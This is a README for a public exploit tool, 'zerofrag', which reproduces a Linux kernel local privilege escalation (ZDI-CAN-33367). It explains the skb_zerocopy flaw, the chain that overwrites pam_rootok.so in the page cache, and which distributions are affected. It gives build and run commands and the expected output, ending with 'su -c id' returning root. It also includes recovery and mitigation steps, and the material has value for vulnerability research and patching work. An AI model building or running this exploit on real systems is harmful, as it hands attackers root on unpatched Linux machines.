# ZDI-CAN-33367 — Linux Kernel LPE via skb_zerocopy page-cache write

Independent reproduction of the Linux kernel local privilege escalation
tracked as **ZDI-CAN-33367** ("skb_zerocopy Shared-Frag Flag Drop").

Confirmed on **Debian 13 (trixie)** kernel `6.12.113+deb13-amd64`
with `libpam-modules 1.7.0-5`, no special configuration required.

## Vulnerability

`skb_zerocopy()` in `net/core/skbuff.c` silently drops the
`SKBFL_SHARED_FRAG` ownership flag when copying socket-buffer fragments.
An ESP (IPsec) receive path that calls `skb_cow_data()` on such an skb
performs in-place AES-CBC decryption directly into the page-cache page
of a root-owned read-only file.

Attack chain:
```
splice(file→udp) → NFQUEUE → TC pedit → ESP packet
→ in-place decrypt → page cache write → pam_rootok.so patched
→ su without password → root
```

Original report: https://lore.kernel.org/lkml/BYAPR01MB3830CECF5D0871064C59BA0280662@BYAPR01MB3830.prod.exchangelabs.com/  
Upstream fix: https://lists.openwall.net/netdev/2026/10/22/204

## Affected

| Distribution | Kernel | Status |
|---|---|---|
| Debian 13 (trixie) | 6.12.113+deb13-amd64 | **vulnerable** |
| Ubuntu 26.04 | 7.0.0-42-generic | vulnerable (requires launcher) |
| AlmaLinux 10.2 | 6.12.0-211.33.1.el10_2 | patched (2026-10-28) |

## Build

```bash
# Debian 13
sudo apt install gcc libmnl-dev libssl-dev

git clone https://github.com/YOU/zerofrag-debian13
cd zerofrag-debian13
bash build.sh
```

## Usage

```bash
# Debian 13 / openSUSE / AlmaLinux (direct unshare, no launcher needed)
./zerofrag

# Ubuntu 26.04 (requires launcher due to apparmor_restrict_unprivileged_userns)
./zerofrag --launcher podman

# Check which profile matched
./zerofrag --identify
```

Expected output on Debian 13:

```
PROFILE_ID=debian13
MUTATE before=5013000000000000 after=1015000000000000
LPE_RESULT=PASS
FINAL_RESULT=PASS
```

After `LPE_RESULT=PASS`:

```bash
su -c id
# uid=0(root) gid=0(root) groups=0(root)
```

## Recovery

The mutation is page-cache only — the on-disk file is not modified.

```bash
python3 -c "
import ctypes, ctypes.util, os
libc = ctypes.CDLL(ctypes.util.find_library('c'))
fd = os.open('/usr/lib/x86_64-linux-gnu/security/pam_rootok.so', os.O_RDONLY)
libc.posix_fadvise(fd, 0, 0, 4)
os.close(fd)
"
```

Or simply reboot.

## Mitigation

```bash
install esp4 /bin/true
install esp6 /bin/true
```

Disables ESP receive path. IPsec will not function while active.

## Attribution

Based on original ZDI-CAN-33367 research and report.  
Independent reproduction and Debian 13 profiling.

**For educational and authorized testing only.**  
Run only against systems you own or are explicitly authorized to test.
